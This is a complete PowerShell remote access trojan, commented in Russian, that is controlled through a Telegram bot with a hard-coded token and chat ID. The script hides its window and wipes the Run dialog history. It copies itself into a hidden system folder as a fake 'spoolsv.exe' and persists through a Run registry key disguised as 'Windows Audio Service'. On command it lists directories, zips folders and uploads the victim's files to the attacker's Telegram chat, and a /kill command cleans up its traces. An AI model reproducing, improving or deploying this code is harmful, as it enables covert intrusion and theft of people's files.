# RAT через Telegram Bot - РАДИКАЛЬНО ИСПРАВЛЕННАЯ ВЕРСИЯ
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Установка кодировки UTF-8 для корректного отображения русских символов
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Скрытие окна PowerShell
$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null

# Очистка истории RUN при запуске
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# Функция отправки сообщений с правильной кодировкой
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            # Альтернативный метод с формой
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# Функция отправки файлов
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch {
        try {
            # Резервный метод отправки файла
            $fileInfo = Get-Item $FilePath
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
        } catch { }
    }
}

# Функция создания ZIP архива
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            # Резервный метод архивации через COM
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

# РАДИКАЛЬНОЕ ИСПРАВЛЕНИЕ: Полная перезапись системы установки
# Уникальная установка в автозагрузку с двойной проверкой
$installMarker = "$env:TEMP\rat_installed.marker"

# Проверяем, не установлен ли уже RAT
if (!(Test-Path $installMarker)) {
    # Создаем маркер установки
    "Installed $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
    
    # Уникальная папка для установки
    $hiddenFolder = "$env:WINDIR\System32\drivers\etc\hosts_backup"
    if (!(Test-Path $hiddenFolder)) { 
        New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
        attrib +s +h "$hiddenFolder" 2>&1 | Out-Null
    }
    
    $scriptPath = "$hiddenFolder\spoolsv.exe"
    
    # Копируем скрипт только если его там нет
    if (!(Test-Path $scriptPath)) {
        $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
        $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
    }
    
    # Установка в автозагрузку с уникальным именем
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    
    $uniqueName = "Windows Audio Service"
    Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
}

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""
$global:LastUpdateId = 0

# РАДИКАЛЬНОЕ ИСПРАВЛЕНИЕ: Полная очистка истории сообщений при запуске
try {
    $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
    Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
} catch { }

# Отправка информации о запуске
Send-Telegram "RAT активирован на $env:COMPUTERNAME
Доступные команды:
/help - список команд
/ls - список файлов
/cd [папка] - сменить директорию
/download [файл] - скачать файл
/kill - самоуничтожение"

# Основной цикл опроса
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # Обработка команд
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "Доступные команды:
/help - показать это сообщение
/ls - список файлов в текущей директории
/cd [папка] - сменить директорию
/download [файл] - скачать файл или папку
/kill - самоуничтожение RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "Содержимое $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            
                            # Отправляем содержимое новой директории с помощью /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    # Архивируем папку
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "Ошибка архивации папки: $target"
                                    }
                                } else {
                                    Send-Telegram "Файл $target отправлен" $fullPath
                                }
                            } else {
                                Send-Telegram "Файл/папка не найдены: $target"
                            }
                        }
                        "^/kill$" {
                            Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                            
                            try {
                                # Создаем временный скрипт очистки с запасным URL
                                $cleanupContent = @'
# Альтернативный cleanup скрипт
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

function Send-Telegram {
    param([string]$Message)
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{chat_id = $ChatID; text = $Message}
    try { Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null } catch { }
}

Send-Telegram "🔄 Запуск альтернативной очистки..."

# Удаляем файлы
$files = @(
    "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
    "$env:TEMP\rat_installed.marker",
    "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe"
)

foreach ($file in $files) {
    if (Test-Path $file) {
        try { Remove-Item $file -Force -ErrorAction SilentlyContinue } catch { }
    }
}

# Очищаем автозагрузку
$regPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
)

foreach ($regPath in $regPaths) {
    try {
        Remove-ItemProperty -Path $regPath -Name "Windows Audio Service" -Force -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# Очищаем историю RUN
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

Send-Telegram "✅ Альтернативная очистка завершена"
'@
                                
                                $cleanupPath = "$env:TEMP\cleanup_$(Get-Random).ps1"
                                $cleanupContent | Out-File -FilePath $cleanupPath -Encoding UTF8
                                
                                # Запускаем скрипт очистки
                                Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`"" -WindowStyle Hidden
                                
                                # Даем время на запуск cleanup
                                Start-Sleep -Seconds 2
                                
                                # Завершаем текущий процесс
                                Stop-Process -Id $pid -Force
                                
                            } catch {
                                Send-Telegram "❌ Ошибка при самоуничтожении"
                                
                                # Аварийная очистка
                                try {
                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                    Stop-Process -Id $pid -Force
                                } catch {
                                    cmd /c "taskkill /f /pid $pid" 2>&1 | Out-Null
                                }
                            }
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
